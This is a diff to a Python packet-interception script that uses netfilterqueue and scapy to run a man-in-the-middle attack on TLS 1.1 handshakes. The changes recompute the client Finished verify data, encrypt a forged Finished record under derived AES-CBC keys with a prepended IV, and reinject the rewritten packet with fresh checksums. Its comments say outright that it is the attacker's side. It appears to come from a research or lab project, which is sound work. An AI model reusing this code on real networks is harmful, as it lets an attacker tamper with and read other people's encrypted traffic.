@@ -243,6 +243,8 @@ def handler_queue_1(pkt: netfilterqueue.Packet):
             #print(scpy_pkt["IP"].show2())
             print(scpy_pkt.show2())
 
+            #after rebuilding with show2(), we must get the tlsmsg again before concatenating it...
+            tlsmsg : TLSClientHello = (scpy_pkt["TLSClientHello"])
 
             pkt.set_payload(bytes(scpy_pkt))
             print(f"(client concat) client hello length: " + str(len(bytes(tlsmsg))))
@@ -339,6 +341,9 @@ def handler_queue_1(pkt: netfilterqueue.Packet):
                 # we received a message from the legitimate server. The illegitimate (CHANGED message) will be useful for
                 # when we calculate/modify the finished message of the Server, so when we (attacker) act as a server
                 # to the client
+
+                # after rebuilding with show2(), we must get the generic_tls_layer again before concatenating it...
+                generic_tls_layer = scpy_pkt[TLS].getlayer(TLS, i)
                 server_finished_concatenation += get_handshake_message_bytes(generic_tls_layer)
                 print(f"(server concat) generic tls layer {i} length: " + str(len(get_handshake_message_bytes(generic_tls_layer))))
                 # todo: perchè è None la length della print del get_handshake_message_bytes? controlla anche gli altri posti...
@@ -423,6 +428,7 @@ def handler_queue_1(pkt: netfilterqueue.Packet):
                     print(scpy_pkt.show2())
 
                     # for the client finished message we take the TLS record's content AFTER changing it
+                    generic_tls_layer = scpy_pkt[TLS].getlayer("TLS", i)
                     client_finished_concatenation += get_handshake_message_bytes(generic_tls_layer)
                     print(f"(client concat) generic tls layer {i} length: " + str(len(get_handshake_message_bytes(generic_tls_layer))))
 
@@ -486,7 +492,7 @@ def handler_queue_1(pkt: netfilterqueue.Packet):
             server_write_IV = key_block[120:136]
 
             #now the 12 byte verify field
-            new_verify_field = tls_1_1_prf.compute_verify_data("client", "write", server_finished_concatenation, computed_master_key)
+            new_verify_field = tls_1_1_prf.compute_verify_data("client", "write", client_finished_concatenation, computed_master_key)
             print(f"Computed verify... " + str(new_verify_field))
 
             #we need to append initially the following 4 bytes, 1 for the type, 3 for the length
@@ -532,7 +538,7 @@ def handler_queue_1(pkt: netfilterqueue.Packet):
 
             cipher = Cipher(algorithms.AES256(client_write_key), modes.CBC(client_write_IV))
             encryptor = cipher.encryptor()
-            plaintext = client_write_IV + temp_pre_encryption + signature
+            plaintext = temp_pre_encryption + signature # only these two as the plaintext, choose a random IV and prepend it after you encrypt this plaintext...
 
             padding_length = 16 - (len(plaintext) % 16)
             if padding_length == 0:
@@ -546,17 +552,30 @@ def handler_queue_1(pkt: netfilterqueue.Packet):
 
             ct = encryptor.update(plaintext) + encryptor.finalize()
 
+            #final payload will be IV and ct concatenated!
+            # according to section 6.2.3.2 of RFC 4346 and my tests, i found out that IV gets prepended to the ciphertext, before
+            # getting sent... there is even another option, which is to set the "cipher" IV to 0 and encrypt "our" IV by prepending it to the ciphertext, like the
+            # one calculated in the KDF, as the FIRST block, then just send the ciphertext (WITHOUT PREPENDING THE "cipher" IV to the ciphertext) (option 2.a page 22 rfc 4346)
+            # In either way, it seems that the tlslite-ng implementation uses the first option and generates the IV separately
+            # for each Record, as per point 1 of page 22 of RFC 4346 (look session.py "derive_keys" of that library!)...
+            ct = client_write_IV + ct # prepend the "random" IV... who cares if we don't generate it as per RFC... WE'RE THE ATTACKERS!
 
             print(b"Ciphertext: " + ct)
             print("Ciphertext length: " + str(len(ct)))
 
-            generic_tls_layer.msg = ct
             print(scpy_pkt.show2())
 
-            exit(0)
+            final_packet_after_manual_insertion = IP(bytes(scpy_pkt)[0:-(len(ct))] + ct)
+
+            del final_packet_after_manual_insertion["TCP"].chksum
+            del final_packet_after_manual_insertion["IP"].chksum
+            del final_packet_after_manual_insertion["IP"].len
+            print(final_packet_after_manual_insertion.show2())
 
 
-            pkt.set_payload(bytes(scpy_pkt))
+
+            pkt.set_payload(bytes(final_packet_after_manual_insertion))
+
 
 
 
